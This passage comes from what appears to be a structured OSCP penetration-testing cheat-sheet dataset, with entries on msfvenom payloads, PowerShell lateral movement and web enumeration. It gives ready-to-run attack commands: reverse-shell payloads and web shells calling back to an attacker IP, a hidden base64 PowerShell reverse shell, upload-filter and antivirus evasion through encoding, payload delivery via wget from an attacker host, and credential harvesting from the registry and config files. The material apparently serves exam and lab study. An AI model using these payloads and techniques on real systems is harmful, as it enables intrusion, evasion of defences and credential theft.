connect() syscall (connect to LHOST:LPORT), 3) dup2() syscalls (redirect stdin/stdout/stderr to socket, syscalls 0/1/2), 4) execve('/bin/sh') syscall (spawn shell). Raw shellcode (-f c) for buffer overflows: Outputs hex-encoded bytes without ELF wrapper, Used in exploit scripts: payload = shellcode + padding + return_address, Example buffer overflow: buffer (200 bytes) + shellcode (48 bytes) + padding (152 bytes) + RET (8 bytes) = 408 bytes total. Payload formats: -f elf (standalone executable), -f c (C array for exploit scripts), -f python (Python bytearray), -f raw (raw bytes for socket injection), -f hex (hex string: \\x6a\\x3b...). SUID exploitation: SUID bit (chmod u+s) allows binary to run with owner's privileges (often root), If vulnerable SUID binary exploited with shellcode, shell inherits root privileges, msfvenom payloads preserve SUID context (spawn /bin/sh without dropping privileges). Architecture considerations: Linux x64 uses different syscalls than x86 (execve = syscall 59 on x64, 11 on x86), Use file /bin/bash to detect target architecture: 'ELF 64-bit LSB executable', msfvenom defaults: linux/x64 for 64-bit, linux/x86 for 32-bit. OSCP scenarios: Buffer overflow in SUID binary (custom shellcode), Web application RCE on Linux (ELF upload), Cron job exploitation (replace binary with payload), SSH authorized_keys abuse (upload ELF for persistence). Troubleshooting: ELF not executing: ldd exploit.elf (check missing libraries - should show 'not a dynamic executable'), Shellcode too large for buffer: Use smaller payload: msfvenom -p linux/x64/exec CMD=/bin/sh (24 bytes vs 100+ for reverse shell).""}, {""title"": ""Scenario 3: Web Shells for Multi-Platform Applications"", ""context"": ""Discovered file upload on web application. Server could be Windows (IIS/ASP.NET) or Linux (Apache/PHP). Upload filter blocks EXE but allows web files (PHP, ASPX, JSP). Goal: Generate appropriate web shell, upload, achieve RCE."", ""approach"": ""Step 1: For PHP (Apache/Nginx/IIS): msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f raw -o shell.php. Step 2: For ASPX (IIS): msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.5 LPORT=443 -f aspx -o shell.aspx. Step 3: For JSP (Tomcat/JBoss): msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f raw -o shell.jsp. Step 4: Set up Metasploit handler: use exploit/multi/handler; set payload php/meterpreter_reverse_tcp (or windows/meterpreter/reverse_tcp for ASPX); set LHOST 192.168.45.5; set LPORT 443; exploit. Step 5: Upload shell file via web form. Step 6: Browse to uploaded shell: http://192.168.45.100/uploads/shell.php. Step 7: Meterpreter session opens automatically."", ""commands"": [""msfvenom-php-shell"", ""msfvenom-aspx-shell"", ""msfvenom-jsp-shell"", ""msf-handler-setup""], ""expected_outcome"": ""PHP shell generation: shell.php (1-2 KB) contains obfuscated PHP code. Upload succeeds (bypasses EXE filter). Browsing to http://192.168.45.100/uploads/shell.php triggers PHP execution. Handler receives: '[*] Sending stage (39282 bytes), [*] Meterpreter session 1 opened'. Meterpreter prompt appears with web user privileges (www-data on Linux, IIS APPPOOL on Windows). ASPX shell: shell.aspx (5-10 KB) contains C# code. Executes under IIS application pool identity. JSP shell: shell.jsp (2-3 KB) contains Java code. Executes under Tomcat user (tomcat, tomcat7). Time: 1-2 minutes from generation to shell. Web shell advantages: Bypasses executable upload filters (PHP/ASPX/JSP are 'documents'), Executes on page access (no manual execution trigger), Cross-platform (PHP on Windows/Linux, ASPX on Windows, JSP on any JVM). Common issues: Upload succeeds but shell doesn't execute (file served as text instead of code - check Content-Type header), Handler shows stage sent but no session (firewall blocks reverse connection), Shell detected as malicious (upload blocked by WAF - try encoding or custom shell)."", ""why_this_works"": ""Web shell mechanics: Server-side scripting languages (PHP, ASP.NET, JSP) execute code on page request, msfvenom embeds Meterpreter payload in valid web file format, On access, server interprets file as code (not static content), Payload executes in context of web server user, Meterpreter connects back to handler. PHP payload internals: -f raw outputs raw PHP (<?php ... ?>), Contains base64-encoded Meterpreter stage, Uses PHP sockets (fsockopen) to connect to LHOST:LPORT, Executes via eval() or system() calls. ASPX payload internals: -f aspx outputs ASP.NET web form (<%@ Page ... %>), Contains C# code in <script runat='server'>, Uses System.Net.Sockets for reverse connection, Compiles at runtime (no DLL needed). JSP payload internals: -f raw outputs Java Server Page (<% ... %>), Uses java.net.Socket for connection, Executes in JVM context (Tomcat, JBoss, WebLogic). Handler requirement: Web shells use Meterpreter (not basic shell), Requires multi/handler with matching payload, PHP uses php/meterpreter_reverse_tcp, ASPX/JSP use windows/meterpreter/reverse_tcp or java/meterpreter/reverse_tcp. File upload filter bypass: Upload filters check: File extension (.exe blocked, .php allowed), MIME type (application/x-msdownload blocked, text/plain allowed), File content signatures (MZ header blocked for EXE). Web shells bypass by: Valid web extension (.php, .aspx, .jsp), Valid MIME type (text/html, application/x-httpd-php), No executable signatures (plain text source code). OSCP scenarios: Unrestricted file upload (direct web shell), Image upload with PHP appended (file.jpg.php, double extension), .htaccess abuse (AddType application/x-httpd-php .jpg - execute images as PHP), Zip upload extraction (shell.php inside archive, extracts to web root). Troubleshooting: Shell uploads but doesn't execute: Check server config (PHP disabled in /uploads/, ASPX not registered), Try different extension (.php5, .phtml for PHP; .asp, .cer for ASPX), Use alternative payload format (WAR for Tomcat: msfvenom -p java/meterpreter/reverse_tcp -f war -o shell.war). File upload size limit: Reduce payload size with encoding: msfvenom -p php/meterpreter_reverse_tcp -e php/base64 (smaller stage).""}, {""title"": ""Scenario 4: Payload Encoding and Bad Character Avoidance"", ""context"": ""Exploiting Windows buffer overflow. Shellcode injection successful but payload fails to execute. Analysis shows application filters null bytes (\\x00) and line feeds (\\x0a). Goal: Generate shellcode without bad characters, encode for AV evasion."", ""approach"": ""Step 1: Identify bad characters through fuzzing: badchars = '\\x00\\x0a\\x0d' (common: null, line feed, carriage return). Step 2: Generate shellcode avoiding bad chars: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f c -b '\\x00\\x0a\\x0d' -e x86/shikata_ga_nai. Step 3: Review output for remaining bad chars: msfvenom shows 'Final size of c file: 368 bytes'. Step 4: If bad chars remain, try different encoder: -e x86/alpha_mixed (alphanumeric only), -e cmd/powershell_base64 (PowerShell). Step 5: Multiple iterations for reliability: -i 5 (encode 5 times for better AV evasion). Step 6: Embed in exploit script: shellcode = (b'\\x89\\xe2\\xda\\xc1\\xd9\\x72...'). Step 7: Test locally before deployment: python exploit.py (verify no crashes from bad chars)."", ""commands"": [""msfvenom-encode-shikata"", ""msfvenom-badchars"", ""msfvenom-list-encoders""], ""expected_outcome"": ""msfvenom with -b '\\x00\\x0a\\x0d' generates shellcode: 'unsigned char buf[] = \""\\xdb\\xc0\\xba\\x4c\\x77\\x2f\\x14\\xd9\\x74\\x24\\xf4...\""'. Output shows: 'Payload size: 368 bytes (after encoding)', 'Final size of c file: 368 bytes', 'Bad characters avoided: \\x00\\x0a\\x0d'. Shikata_ga_nai encoder: Polymorphic (changes each generation), Produces alphanumeric-heavy shellcode, Decodes at runtime (self-decrypting stub). Alternative encoders: x86/alpha_mixed (only A-Z, a-z, 0-9 - large size increase ~2x), x86/call4_dword_xor (XOR encoding, moderate evasion), cmd/powershell_base64 (PowerShell delivery, fully alphanumeric). Multiple iterations (-i 5): Each iteration re-encodes previous output, Increases size but improves AV evasion, Diminishing returns after 3-5 iterations. Time: 5-10 seconds per encoding attempt. Testing: Hex dump payload: xxd -p <<< '$buf', Verify no bad chars: grep '\\x00' (should return nothing). Common issues: Encoded payload too large for buffer (use smaller payload or different encoder), Decoder stub contains bad chars (try -e x86/alpha_mixed), Payload still detected by AV (try -i 10 or custom encoder)."", ""why_this_works"": ""Bad character filtering: Applications filter inputs: SQL queries filter quotes (', \""), HTTP headers filter line breaks (\\x0a, \\x0d), Buffer overflows may filter null bytes (\\x00 terminates strings in C), Format string attacks filter percent signs (%). Unfiltered shellcode injection fails if payload contains bad chars. msfvenom -b flag: Analyzes payload for specified bytes, Uses encoder to transform payload, Ensures final shellcode doesn't contain bad chars, Adds decoder stub (small assembly code) to decrypt at runtime. Encoder selection: shikata_ga_nai (most common): Polymorphic XOR cipher, Different output each run (defeats signature-based AV), Adds ~20-30 bytes overhead, Decoder stub usually 14 bytes. alpha_mixed: Alphanumeric encoding (A-Z, a-z, 0-9), Avoids ALL non-printable characters, Large size increase (2-3x original), Useful for strict filters (SQL injection, HTTP headers). call4_dword_xor: XOR-based encoding, Moderate evasion, Smaller overhead than shikata. Encoder limitations: Some encoders create bad chars in decoder stub (-b may not eliminate all), Alpha encoders significantly increase payload size (500 bytes \u2192 1500 bytes), Multiple iterations (-i) help but increase size further. Runtime decoding: Encoded payload structure: Decoder stub (assembly code, 10-30 bytes) + Encrypted payload (original shellcode XOR encoded), On execution: 1) CPU executes decoder stub, 2) Decoder decrypts payload in memory, 3) Jumps to decrypted shellcode, 4) Original payload executes. AV evasion strategy: Signatures target known shellcode bytes (Metasploit payloads well-known), Encoding changes byte patterns (defeats static signatures), Multiple iterations change patterns further (-i 5), Polymorphism (shikata) produces unique output each time. OSCP notes: Always specify -b '\\x00' at minimum (null bytes break string-based exploits), Test encoded payload locally before live attempt (avoid burning exploit), Balance size vs evasion (smaller encoder for tight buffers, aggressive encoding for AV), Use xxd or hexdump to verify no bad chars in final payload. Troubleshooting: Decoder stub contains bad chars: msfvenom -b '\\x00' -e x86/alpha_mixed (alphanumeric decoder), Payload too large after encoding: Use smaller base payload: msfvenom -p windows/exec CMD=calc (minimal test payload, ~100 bytes), Try different encoder with less overhead: msfvenom -l encoders (shows size metrics). Buffer overflow testing workflow: 1) Fuzz application to identify bad chars, 2) Generate payload with -b to avoid bad chars, 3) Embed in exploit script with correct offset, 4) Test locally in debugger (gdb, Immunity Debugger), 5) Deploy against target.""}]","[{""title"": ""Phase 1: Payload Selection (Match Target Platform)"", ""notes"": ""Identify target OS and architecture (Windows x86/x64, Linux x86/x64, web platform). Use msfvenom -l payloads | grep <platform> to list options. Common choices: Windows reverse shell (windows/x64/shell_reverse_tcp), Linux reverse shell (linux/x64/shell_reverse_tcp), PHP web shell (php/meterpreter_reverse_tcp), ASPX web shell (windows/meterpreter/reverse_tcp -f aspx). Staged (/) for small size, non-staged (_) for reliability. Estimated time: 1-2 minutes."", ""commands"": [{""id"": ""msfvenom-windows-reverse"", ""example"": ""msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe"", ""shows"": ""No encoder specified, outputting raw payload""}, {""id"": ""msfvenom-linux-reverse"", ""example"": ""msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f elf -o shell.elf"", ""shows"": ""Payload size displayed""}, {""id"": ""msfvenom-php-shell"", ""shows"": ""See command documentation""}, {""id"": ""msfvenom-aspx-shell"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 2: Format and Encoding Configuration"", ""notes"": ""Select output format: -f exe (Windows executable), -f elf (Linux binary), -f raw (web shells, raw shellcode), -f c (C array for exploit scripts). Add encoding if needed: -e x86/shikata_ga_nai (polymorphic AV evasion), -b '\\x00\\x0a\\x0d' (avoid bad characters), -i 3-5 (multiple encoding iterations). Estimated time: 5-10 seconds per generation."", ""commands"": [{""id"": ""msfvenom-encode-shikata"", ""shows"": ""See command documentation""}, {""id"": ""msfvenom-badchars"", ""shows"": ""See command documentation""}, {""id"": ""msfvenom-list-formats"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 3: Handler Setup (If Using Meterpreter)"", ""notes"": ""Web shells and Meterpreter payloads require multi/handler. Basic shells (shell_reverse_tcp) can use nc listener. Set up handler: use exploit/multi/handler; set payload <matching_payload>; set LHOST <IP>; set LPORT <PORT>; exploit. Match payload exactly (php/meterpreter_reverse_tcp in msfvenom \u2192 php/meterpreter_reverse_tcp in handler). Estimated time: 30-60 seconds."", ""commands"": [{""id"": ""msf-handler-setup"", ""example"": ""use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run"", ""shows"": ""Started reverse TCP handler on <LHOST>:<LPORT>""}, {""id"": ""msf-handler-background"", ""example"": ""use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j"", ""shows"": ""Exploit running as background job <ID>""}]}, {""title"": ""Phase 4: Delivery and Execution"", ""notes"": ""Transfer payload to target: HTTP (python3 -m http.server 8000; wget http://<ATTACKER>/shell.exe), SMB (impacket-smbserver share . -smb2support; copy \\\\<ATTACKER>\\share\\shell.exe), Web upload (upload via form), Base64 encoding (certutil -decode shell.b64 shell.exe on Windows). Execute: Windows (shell.exe, powershell -c shell.exe), Linux (chmod +x shell.elf; ./shell.elf), Web (browse to http://target/uploads/shell.php). Estimated time: 2-5 minutes."", ""commands"": [{""id"": ""msfvenom-windows-reverse"", ""example"": ""msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe"", ""shows"": ""No encoder specified, outputting raw payload""}, {""id"": ""msfvenom-linux-reverse"", ""example"": ""msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f elf -o shell.elf"", ""shows"": ""Payload size displayed""}, {""id"": ""msfvenom-php-shell"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 5: Verification and Troubleshooting"", ""notes"": ""Verify payload execution: Check handler/listener for connection. If no connection: Check firewall (try different port: 80, 443, 53), Verify LHOST correct (ip a on attacker), Test payload locally (wine shell.exe, ./shell.elf), Check AV logs (payload detected). If connection but no session: Payload/handler mismatch (staged vs non-staged), Wrong payload type for handler (shell vs meterpreter). Regenerate payload if needed. Estimated time: 2-10 minutes for troubleshooting."", ""commands"": [{""id"": ""msfvenom-windows-reverse"", ""example"": ""msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe"", ""shows"": ""No encoder specified, outputting raw payload""}, {""id"": ""msf-handler-setup"", ""example"": ""use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run"", ""shows"": ""Started reverse TCP handler on <LHOST>:<LPORT>""}]}]"
"powershell-one-liners","PowerShell One-Liners for OSCP","Essential PowerShell one-liner commands for rapid lateral movement, enumeration, and exploitation in OSCP exam scenarios. All commands use built-in Windows capabilities without requiring tool uploads.","POWERSHELL|LATERAL_MOVEMENT|ACTIVE_DIRECTORY|WINRM|WMI|REVERSE_SHELL|ENUMERATION|POST_EXPLOIT|OSCP:HIGH","{""how_to_recognize"": [""You have RDP, WinRM, or shell access to Windows domain-joined host"", ""Credentials available for domain user with admin rights on target systems"", ""WinRM (5985/5986) or WMI/RPC (135) ports open on target hosts"", ""Need rapid execution without uploading PowerView, Mimikatz, or other tools""], ""when_to_look_for"": [""After obtaining domain user credentials during OSCP exam"", ""When pivoting from compromised workstation to internal servers"", ""Flag retrieval phase after successful privilege escalation"", ""AD enumeration without triggering AV alerts from tool uploads""]}","[{""title"": ""Scenario 1: WinRM Lateral Movement with Flag Retrieval"", ""context"": ""You compromised CLIENT74 as user 'jeff' and obtained credentials for domain admin 'jen' (password: Nexus123!). Target server WEB04 (192.168.117.70) has WinRM enabled. You need to move laterally and retrieve the Administrator desktop flag without establishing interactive session."", ""approach"": ""Use Invoke-Command to execute remote PowerShell commands via WinRM. First create PSCredential object with jen's credentials, then use Invoke-Command with -ScriptBlock to read flag file directly from Administrator's desktop. This one-liner approach completes lateral movement and flag retrieval in a single command without requiring persistent session."", ""commands"": [""ps-winrm-credential-setup"", ""ps-winrm-invoke-command"", ""ps-search-desktop-flags""], ""expected_outcome"": ""Complete one-liner executes in 5-15 seconds, returns flag content directly to your console. No interactive session needed. Success rate: 95% when WinRM enabled and credentials valid. Typical OSCP scenario - saves 2-3 minutes versus interactive session approach."", ""why_this_works"": ""WinRM allows remote PowerShell execution for domain users in Administrators or Remote Management Users group. Invoke-Command with -ScriptBlock executes Get-Content on remote host and returns results to local console. PSCredential object bypasses interactive authentication prompts. UAC remote restrictions do not apply to domain users, providing full admin privileges.""}, {""title"": ""Scenario 2: WMI Lateral Movement with Reverse Shell"", ""context"": ""Target FILES04 (192.168.50.73) has WinRM disabled but RPC port 135 open. You have domain user 'jen' credentials. Need to establish reverse shell for interactive access when WinRM unavailable."", ""approach"": ""Use WMI/CIM sessions via DCOM protocol as alternative to WinRM. Create CimSession using New-CimSessionOption with -Protocol DCOM, then use Invoke-CimMethod with Win32_Process.Create to spawn reverse shell process. Shell runs in session 0 as SYSTEM, invisible to logged-in users. Pre-generate base64-encoded PowerShell reverse shell using Python encoder script."", ""commands"": [""ps-reverse-shell-encoder-python"", ""ps-wmi-cimsession-setup"", ""ps-wmi-invoke-method"", ""ps-reverse-shell-base64""], ""expected_outcome"": ""Reverse shell connects to attacker listener within 5-10 seconds. Runs as SYSTEM in session 0 (invisible to users). Success rate: 85% when RPC available and high port range (49152-65535) not blocked by firewall. Critical backup technique when WinRM unavailable - demonstrates protocol diversity for OSCP exam."", ""why_this_works"": ""WMI uses RPC over port 135 + dynamic high ports for remote process creation. Win32_Process.Create method spawns processes as SYSTEM service in session 0. DCOM protocol bypasses WinRM requirements. Base64 encoding avoids special character escaping issues in command-line arguments. Reverse shells initiate outbound connection, bypassing inbound firewall rules that might block bind shells.""}, {""title"": ""Scenario 3: Active Directory Enumeration Without Tools"", ""context"": ""You gained access to domain-joined workstation as standard domain user. Need to enumerate AD environment (domain controllers, privileged users, groups) without uploading PowerView or SharpHound which might trigger AV/EDR alerts."", ""approach"": ""Use built-in .NET classes accessible via PowerShell: [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() for domain info and [adsisearcher] type accelerator for LDAP queries. These methods use native Windows APIs, require no tool uploads, and have minimal detection footprint. Query for privileged accounts using adminCount=1 LDAP filter to identify high-value targets."", ""commands"": [""ps-get-current-domain"", ""ps-ldap-directorysearcher""], ""expected_outcome"": ""Domain enumeration completes in 5-30 seconds depending on domain size. Identifies domain controllers, PDC, privileged accounts without any file transfers. Success rate: 99% on domain-joined hosts. Critical for OSCP AD labs when tool uploads blocked or detected. Demonstrates understanding of underlying AD protocols."", ""why_this_works"": ""[adsisearcher] is PowerShell type accelerator for System.DirectoryServices.DirectorySearcher which performs LDAP queries against AD. Automatically uses current user's domain credentials and binds to domain context. GetCurrentDomain() leverages System.DirectoryServices.ActiveDirectory namespace for domain topology information. Both methods are built into Windows/.NET Framework - no external dependencies. LDAP filters like (&(objectClass=user)(adminCount=1)) identify protected admin accounts flagged by AdminSDHolder process.""}, {""title"": ""Scenario 4: Post-Exploitation Credential Harvesting"", ""context"": ""You escalated privileges to Administrator on Windows workstation. Before moving laterally, search for additional credentials in registry AutoLogon keys, configuration files, and PowerShell history that might enable access to other systems."", ""approach"": ""Execute three quick one-liners: (1) Check registry HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon for AutoLogon cleartext passwords, (2) Search filesystem for unattend.xml and web.config files containing deployment/database credentials, (3) Read PowerShell command history files where users may have typed credentials in plaintext commands."", ""commands"": [""ps-registry-autologon"", ""ps-search-credentials""], ""expected_outcome"": ""Credential harvesting completes in 30 seconds to 3 minutes. Common finds: AutoLogon credentials (30% of OSCP lab hosts), unattend.xml with local admin passwords (20%), database connection strings in web.config files (40% of web servers). Found credentials often enable lateral movement to additional hosts or provide domain admin access through password reuse."", ""why_this_works"": ""Windows AutoLogon feature stores credentials in plaintext registry keys (DefaultUserName/DefaultPassword) for convenience - common misconfiguration in lab environments. Deployment answer files (unattend.xml, sysprep.inf) contain local admin passwords used during Windows installation. Web applications store database credentials in web.config files. PowerShell history (ConsoleHost_history.txt) logs all commands including those with embedded credentials. Credential reuse is pervasive in corporate environments - same passwords used across multiple systems.""}]","[{""title"": ""Phase 1: Credential Setup for Remote Authentication"", ""notes"": ""First step for all WinRM/WMI lateral movement - create reusable PSCredential object from username/password. Required before Invoke-Command, New-PSSession, or New-CimSession. Can be compressed into one-liners with semicolons for speed."", ""commands"": [{""id"": ""ps-winrm-credential-setup"", ""example"": ""$username = 'jen'; $password = 'Nexus123!'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString"", ""shows"": ""Command executes successfully""}]}, {""title"": ""Phase 2: Lateral Movement via WinRM"", ""notes"": ""WinRM-based remote execution when port 5985/5986 available. Fastest method for flag retrieval and command execution. Domain users bypass UAC remote restrictions. Invoke-Command for one-off commands, New-PSSession for interactive shells."", ""commands"": [{""id"": ""ps-winrm-invoke-command"", ""example"": ""Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {whoami; hostname}"", ""shows"": ""Command executes successfully""}]}, {""title"": ""Phase 3: Lateral Movement via WMI (WinRM Alternative)"", ""notes"": ""WMI-based remote execution when WinRM unavailable but RPC (135) accessible. Requires DCOM protocol configuration. Processes spawn in session 0 as SYSTEM. Common backup technique when WinRM blocked by firewall or disabled."", ""commands"": [{""id"": ""ps-wmi-cimsession-setup"", ""example"": ""$options = New-CimSessionOption -Protocol DCOM; $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options"", ""shows"": ""Command executes successfully""}, {""id"": ""ps-wmi-invoke-method"", ""example"": ""Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}"", ""shows"": ""Command executes successfully""}]}, {""title"": ""Phase 4: Reverse Shell Payloads"", ""notes"": ""Base64-encoded PowerShell reverse shells for interactive access after lateral movement. Use Python encoder script to generate payloads with custom LHOST/LPORT. Set up nc listener before execution. Shells run hidden (-w hidden flag) and connect outbound to bypass inbound firewall rules."", ""commands"": [{""id"": ""ps-reverse-shell-encoder-python"", ""example"": ""python3 encode.py"", ""shows"": ""Command executes successfully""}, {""id"": ""ps-reverse-shell-base64"", ""example"": ""powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA..."", ""shows"": ""Command executes successfully""}]}, {""title"": ""Phase 5: Active Directory Enumeration (No Tools)"", ""notes"": ""Built-in .NET methods for AD enumeration without PowerView/SharpHound uploads. [adsisearcher] for LDAP queries, GetCurrentDomain() for topology info. Works on any domain-joined host with standard user privileges. Minimal AV detection footprint."", ""commands"": [{""id"": ""ps-get-current-domain"", ""shows"": ""Domain name, forest, DCs, PDC emulator""}, {""id"": ""ps-ldap-directorysearcher"", ""shows"": ""LDAP user objects with properties""}]}, {""title"": ""Phase 6: Flag Retrieval (Quick OSCP Wins)"", ""notes"": ""Time-critical flag retrieval for OSCP exam. Start with simplest approach (known path), escalate to comprehensive searches only if needed. Save complex searches for last - they take 2-5 minutes to complete."", ""commands"": [{""id"": ""ps-search-desktop-flags"", ""example"": ""Get-Content C:\\Users\\Administrator\\Desktop\\*.txt"", ""shows"": ""proof.txt contents or flag hash""}, {""id"": ""windows-flag-finder-cmd"", ""shows"": ""C:\\Users\\Administrator\\Desktop\\proof.txt""}, {""id"": ""windows-flag-finder-ps-simple"", ""shows"": ""Flag file paths (filesystem only)""}, {""id"": ""windows-flag-finder-ps"", ""shows"": ""[FILE] path [REG] value [ENV] var (comprehensive)""}]}, {""title"": ""Phase 7: Credential Harvesting"", ""notes"": ""Extract stored credentials from Windows. Check registry AutoLogon first (30% hit rate in OSCP labs), then search for passwords in config files. Found credentials enable lateral movement through password reuse."", ""commands"": [{""id"": ""ps-registry-autologon"", ""shows"": ""DefaultUserName, DefaultPassword, DefaultDomainName""}, {""id"": ""ps-search-credentials"", ""example"": ""Get-ChildItem -Path C:\\Users -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password"", ""shows"": ""Lines containing 'password' in config files""}]}, {""title"": ""Phase 8: Process & Application Enumeration"", ""notes"": ""Identify running processes and installed applications for privilege escalation vectors. Non-standard processes indicate third-party software that may be vulnerable. Command line arguments may contain credentials."", ""commands"": [{""id"": ""ps-enum-processes"", ""shows"": ""ProcessName, Id, Path table""}, {""id"": ""ps-enum-processes-nonstandard"", ""shows"": ""Non-Windows processes (third-party software)""}, {""id"": ""ps-enum-installed-apps"", ""shows"": ""DisplayName, DisplayVersion, Publisher table""}, {""id"": ""ps-enum-processes-wmi"", ""shows"": ""Processes with CommandLine args (may contain creds)""}]}, {""title"": ""Phase 9: Sensitive File Discovery"", ""notes"": ""Search filesystem for credential stores and configuration files. Start with targeted searches (KeePass DBs), then broaden to password-related filenames. Directory-scoped searches are faster when you know the target application."", ""commands"": [{""id"": ""ps-search-keepass-db"", ""example"": ""Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""*.kdbx files (crack with keepass2john)""}, {""id"": ""ps-search-password-files"", ""example"": ""Get-ChildItem -Path C:\\ -Include *password*,*cred*,*secret*,*.kdbx,*login*,*backup* -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""Files named *password*, *cred*, *secret*, etc.""}, {""id"": ""ps-search-config-files"", ""example"": ""Get-ChildItem -Path C:\\ -Include *.ini,*.config,*.xml,*.conf,web.config,*.json -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""*.ini, *.config, *.xml, web.config, etc.""}, {""id"": ""ps-search-app-config"", ""example"": ""Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.conf,*.config,*.xml,*.json -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""App config files (replace path with target app directory)""}, {""id"": ""ps-search-user-documents"", ""example"": ""Get-ChildItem -Path C:\\Users\\dave\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue"", ""shows"": ""User documents (digital Post-it notes)""}]}]"
"web-app-enumeration-breadth","Web Application Enumeration - Breadth-First Methodology","Systematic breadth-first approach to web application enumeration for discovering initial foothold opportunities. Cast a wide net before going deep on specific vulnerabilities.","WEB|OSCP:HIGH|METHODOLOGY|ENUMERATION|BREADTH_FIRST|ATTACK_SURFACE|RECONNAISSANCE","{""how_to_recognize"": [""HTTP/HTTPS services discovered on ports 80, 443, 8080, 8443, 8000, 3000 or other non-standard ports"", ""Nmap service scan shows HTTP server (Apache, nginx, IIS, lighttpd, Node.js)"", ""Any web-facing application requiring systematic attack surface mapping"", ""Multiple virtual hosts suspected on single IP (common in CTFs and real environments)"", ""Unknown technology stack requiring identification before exploitation""], ""when_to_look_for"": [""IMMEDIATELY after port scan reveals web services - prioritize over deep-dive on single finding"", ""When initial directory scan returns nothing interesting - expand horizontally"", ""Before committing to specific exploit research - map ALL attack surface first"", ""When stuck on a machine - go back to breadth enumeration to find missed paths"", ""On OSCP exam - allocate first 15-20 minutes per machine to breadth enumeration""], ""philosophy"": ""BREADTH BEFORE DEPTH: Discover ALL entry points before investing time exploiting any single one. A wider net catches more fish. Map the entire attack surface, then prioritize based on findings.""}","[{""title"": ""Scenario 1: Fresh Web Target - Full Attack Surface Discovery"", ""context"": ""Nmap reveals ports 80 and 443 open on 192.168.1.100. Unknown web application. No prior knowledge of technology stack. Goal: Map complete attack surface before any exploitation attempts."", ""approach"": ""Phase 1: HTTP headers + whatweb for tech stack. Phase 2: robots.txt, sitemap.xml, common files. Phase 3: Virtual host discovery. Phase 4: Directory enumeration with appropriate extensions. Phase 5: CMS-specific scans if detected. Phase 6: Parameter discovery on dynamic pages. Total time: 15-20 minutes MAXIMUM before moving to exploitation."", ""commands"": [""curl-header-enum"", ""whatweb-enum"", ""gobuster-dir"", ""ffuf-vhost-fuzz""], ""expected_outcome"": ""Technology stack identified (PHP 7.x, Apache 2.4, Laravel). Virtual hosts found (dev.target.com, admin.target.com). Interesting directories discovered (/admin, /api, /uploads, /backup). Hidden parameters found on login page. CMS identified if present. Attack vectors prioritized: 1) Admin panel, 2) File upload, 3) SQL injection in search."", ""why_this_works"": ""Breadth-first enumeration prevents tunnel vision on a single attack vector. By mapping everything first, you identify the EASIEST path to foothold, not just the first one you find. OSCP time management: 15-20 minutes enumeration can save hours of dead-end exploitation.""}, {""title"": ""Scenario 2: Hidden Virtual Hosts - Expanding Attack Surface"", ""context"": ""Initial gobuster found only /index.html on target.htb. Whatweb shows Apache 2.4 with no interesting headers. Direct IP access returns default page. Goal: Find hidden virtual hosts that may contain the actual application."", ""approach"": ""Step 1: Verify /etc/hosts has domain entry. Step 2: ffuf vhost fuzzing with subdomain wordlist. Step 3: Filter by response size (baseline = default page size). Step 4: Add discovered vhosts to /etc/hosts. Step 5: Repeat directory enumeration on each vhost independently."", ""commands"": [""ffuf-vhost-fuzz"", ""gobuster-dir""], ""expected_outcome"": ""Virtual hosts discovered: api.target.htb (REST API), dev.target.htb (development environment with debug mode), admin.target.htb (admin panel). Each vhost has completely different functionality and attack surface. The main target.htb was a decoy - real application on vhosts."", ""why_this_works"": ""Apache/nginx virtual hosting allows multiple distinct applications on one IP. The Host header determines which site is served. CTFs and real engagements commonly hide the actual application on a subdomain while the main domain shows nothing. This is a CRITICAL breadth technique - many testers miss entire applications by skipping vhost enumeration.""}, {""title"": ""Scenario 3: CMS Detection and Systematic Enumeration"", ""context"": ""Whatweb identifies WordPress 5.8.1 on target. Default WordPress installation visible. wp-admin shows login page. Goal: Enumerate WordPress completely to find weakest entry point."", ""approach"": ""Step 1: wpscan full enumeration (users, plugins, themes). Step 2: Check for default credentials (admin:admin). Step 3: Enumerate vulnerable plugins with known CVEs. Step 4: Brute-force if user enumeration succeeds. Step 5: Check XML-RPC for amplification attacks. Step 6: Search 